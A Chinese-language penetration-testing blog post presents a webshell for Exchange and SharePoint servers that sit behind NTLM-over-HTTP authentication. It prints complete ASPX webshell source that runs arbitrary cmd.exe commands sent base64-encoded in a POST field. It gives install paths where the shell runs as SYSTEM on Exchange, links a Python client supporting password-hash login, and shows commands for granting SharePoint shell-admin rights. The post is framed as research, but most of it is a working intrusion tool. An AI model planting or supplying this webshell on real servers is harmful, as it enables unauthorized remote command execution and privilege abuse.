---
layout: post
title: 渗透基础——支持NTLM Over HTTP协议的Webshell实现
---


## 0x00 前言
---

在某些环境下，访问Web服务器的资源需要通过NTLM Over HTTP协议进行NTLM认证，而我们在这样的Web服务器使用Webshell时，不仅需要考虑NTLM认证的实现，还需要满足能够在命令行下使用。

本文仅在技术研究的角度介绍一种实现方法，开源代码，分享脚本开发细节。

## 0x01 简介
---

本文将要介绍以下内容：

- 设计思路
- 脚本开发细节
- 开源代码

## 0x02 设计思路
---

通过NTLM Over HTTP协议进行NTLM认证的Web服务器有很多，这里分别以Exchange和SharePoint为例

(1)Exchange测试环境

文件保存的绝对路径：

```
C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\Autodiscover\test.aspx
```

对应的URL为：

```
https://URL/Autodiscover/test.aspx
```

(2)SharePoint测试环境

文件保存的绝对路径：

```
C:\Program Files\Common Files\microsoft shared\Web Server Extensions\15\TEMPLATE\LAYOUTS\test.aspx
```

对应的URL为：

```
http://URL/_layouts/15/test.aspx
```

访问test.aspx时均需要通过NTLM Over HTTP协议进行NTLM认证

这里以一个支持cmd命令的webshell为例进行测试，webshell的地址为：

https://github.com/tennc/webshell/blob/master/aspx/asp.net-backdoors/cmdexec.aspx

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-1-30/2-1.png)

这个webshell需要通过浏览器进行操作，首先完成NTLM认证，接着填入正确的Auth Key和要执行的cmd命令

我们的目标是满足能够在命令行下使用，可以以此为模板进行修改，设计思路如下：

(1)execCmd.aspx

接收Form表单请求作为参数，对Auth Key进行验证

如果验证失败，返回空结果

如果验证成功，执行传入的cmd命令并返回执行结果

(2)aspxCmdNTLM.py

命令行脚本

首先通过NTLM Over HTTP协议完成NTLM认证，这里需要支持明文和用户口令hash两种登录方式

通过Form表单请求发送Auth Key和要执行的cmd命令，接收cmd命令的执行结果

execCmd.aspx和aspxCmdNTLM.py的通信内容作Base64编码，在程序实现上需要考虑Base64编码和解码

## 0x03 脚本开发细节
---

### 1.execCmd.aspx

使用Page_Load方法接收Form表单请求，其中data1用作Auth Key，data2用作cmd命令

Base64编码的实现：

```
byte[] enbytes = Encoding.Default.GetBytes(string1);
string string2 = Convert.ToBase64String(enbytes);
```

Base64解码的实现：

```
byte[] outbyte = Convert.FromBase64String(string1);
string string2 = Encoding.Default.GetString(outbyte);
```

完整的实现代码如下：

```
<%@ Page Language="C#"%>
<%@ Import namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO"%>

<script runat="server">
    private const string AUTHKEY = "UGFzc3dvcmQxMjM0NTY3ODk";
    protected void Page_Load(object sender, EventArgs e)
    {    
        string data1 = Request.Form["data1"];
        if (data1 != AUTHKEY)
        {          
            return;
        }
        string data2 = Request.Form["data2"];
        byte[] outbyte = Convert.FromBase64String(data2);
        string payload = Encoding.Default.GetString(outbyte);              
        string outstr1 = ExecuteCommand(payload);
        byte[] enbytes = Encoding.Default.GetBytes(outstr1);
        string outstr2 = Convert.ToBase64String(enbytes);
        Response.Write(outstr2);
    }

    private string ExecuteCommand(string command)
    {
        try
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Arguments = "/c " + command;
            processStartInfo.RedirectStandardOutput = true;
            processStartInfo.UseShellExecute = false;
            Process process = Process.Start(processStartInfo);
            using (StreamReader streamReader = process.StandardOutput)
            {
                string ret = streamReader.ReadToEnd();
                return ret;
            }
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
</script>
```

### 2.aspxCmdNTLM.py

NTLM认证的实现可以参考之前的代码：

https://github.com/3gstudent/Homework-of-Python/blob/master/checkEWS.py

支持明文和用户口令hash两种登录方式

Form表单请求通过POST方式发送

Base64编码和解码需要注意字符串的格式

完整的代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-Python/blob/master/aspxCmdNTLM.py

execCmd.aspx需要保存在Web服务器

aspxCmdNTLM.py在命令行下执行，连接[execCmd.aspx](https://github.com/3gstudent/test/blob/master/execCmd.aspx)执行cmd命令并获得返回结果

aspxCmdNTLM.py支持明文和用户口令hash两种登录方式

对于Exchange服务器，对应的Webshell权限为System

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-1-30/3-1.png)

可以直接调用Exchange PowerShell

命令示例：

```
python aspxCmdNTLM.py 192.168.1.1 443 https://192.168.1.1/Autodiscover/execCmd.aspx plaintext test.com user1 Password123! "powershell -c \"Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;;Get-MailboxServer\""
```

结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-1-30/3-2.png)

对于SharePoint服务器，对应的Webshell权限为用户权限

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-1-30/3-3.png)

可以尝试调用SharePointServer PowerShell

命令示例：

```
python aspxCmdNTLM.py 192.168.1.1 443 https://192.168.1.1/Autodiscover/execCmd.aspx plaintext test.com user1 Password123! "powershell -c \"Add-PSSnapin Microsoft.SharePoint.PowerShell;Get-SPSite\""
```

这里需要注意，用户需要配置为能够访问数据库才能够执行SharePointServer PowerShell命令

查看可访问数据库的用户列表对应的Powershell命令如下：

```
Add-PSSnapin Microsoft.SharePoint.PowerShell;
Get-SPShellAdmin
```

添加指定用户访问数据库权限对应的Powershell命令如下：

```
Add-PSSnapin Microsoft.SharePoint.PowerShell;
Add-SPShellAdmin Domain\User1
```

删除指定用户访问数据库权限对应的Powershell命令如下：

```
Add-PSSnapin Microsoft.SharePoint.PowerShell;
Remove-SPShellAdmin Domain\User1 -Confirm:$false
```

正常的结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-1-30/3-4.png)

## 0x04 小结
---

本文以Exchange和SharePoint为例，介绍了支持NTLM Over HTTP协议的Webshell实现思路，开源代码，分享脚本开发细节。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)





